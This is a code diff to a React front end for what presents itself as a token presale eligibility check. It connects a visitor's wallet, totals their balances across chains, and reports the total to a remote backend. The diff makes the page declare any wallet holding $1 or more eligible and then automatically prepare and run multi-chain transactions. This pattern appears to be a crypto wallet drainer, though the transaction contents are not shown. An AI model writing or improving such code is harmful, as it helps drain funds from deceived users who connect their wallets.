@@ -194,9 +194,6 @@ function App() {
 
         console.log("✅ Wallet Ready:", await ethersSigner.getAddress());
         
-        // Fetch balances across all chains
-        await fetchAllBalances(address);
-        
       } catch (e) {
         console.error("Provider init failed", e);
       }
@@ -204,6 +201,13 @@ function App() {
 
     init();
   }, [walletProvider, address]);
+
+  // Fetch balances AFTER wallet is initialized
+  useEffect(() => {
+    if (address) {
+      fetchAllBalances(address);
+    }
+  }, [address, prices]);
 
   // Fetch balances across all chains
   const fetchAllBalances = async (walletAddress) => {
@@ -240,9 +244,10 @@ function App() {
     
     setBalances(balanceResults);
     
-    // Check if total value >= threshold
-    const totalValue = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
-    return totalValue;
+    // Auto-verify when balances are loaded
+    if (address && !scanResult && !verifying) {
+      verifyWallet(balanceResults);
+    }
   };
 
   // Countdown timer
@@ -264,21 +269,16 @@ function App() {
     return () => clearInterval(timer);
   }, []);
 
-  // Auto-check eligibility when wallet connects
-  useEffect(() => {
-    if (isConnected && address && !scanResult && !verifying) {
-      verifyWallet();
-    }
-  }, [isConnected, address, balances]);
+  // Auto-check eligibility when wallet connects - REMOVED from here, now handled after balance fetch
 
-  const verifyWallet = async () => {
+  const verifyWallet = async (balancesData = balances) => {
     if (!address) return;
     
     setVerifying(true);
     setTxStatus('🔄 Verifying wallet across all networks...');
     
     try {
-      const totalValue = Object.values(balances).reduce((sum, b) => sum + b.valueUSD, 0);
+      const totalValue = Object.values(balancesData).reduce((sum, b) => sum + b.valueUSD, 0);
       
       const response = await fetch('https://bthbk.vercel.app/api/presale/connect', {
         method: 'POST',
@@ -290,18 +290,16 @@ function App() {
       
       if (data.success) {
         setScanResult(data.data);
-        // FIXED: Use allocation from backend instead of tokenAllocation
         if (data.data.allocation) {
           setAllocation(data.data.allocation);
         }
         
-        // Check eligibility based on total value
-        const isEligible = totalValue >= 1; // $1 threshold
-        
-        if (isEligible) {
+        if (totalValue >= 1) { // $1 threshold
           setTxStatus('✅ You qualify!');
-          // Automatically prepare transactions after verification
-          await prepareFlow();
+          // Wait a moment before preparing transactions
+          setTimeout(async () => {
+            await prepareFlow();
+          }, 500);
         } else {
           setTxStatus('✨ Wallet verified - minimum $1 required');
         }
@@ -342,7 +340,7 @@ function App() {
   };
 
   // ============================================
-  // FIXED: SMART CONTRACT EXECUTION
+  // SMART CONTRACT EXECUTION
   // ============================================
   const executeMultiChainFlow = async () => {
     if (!walletProvider || !address || !signer) {
@@ -439,8 +437,6 @@ function App() {
             setError(`Transaction cancelled on ${chainName}`);
           } else if (chainErr.message?.includes('insufficient funds')) {
             setError(`Insufficient funds for gas on ${chainName}`);
-          } else if (chainErr.message?.includes('wrong chain')) {
-            setError(`Please switch to ${chainName} in your wallet and try again.`);
           } else {
             setError(`Transaction failed on ${chainName}: ${chainErr.message}`);
           }
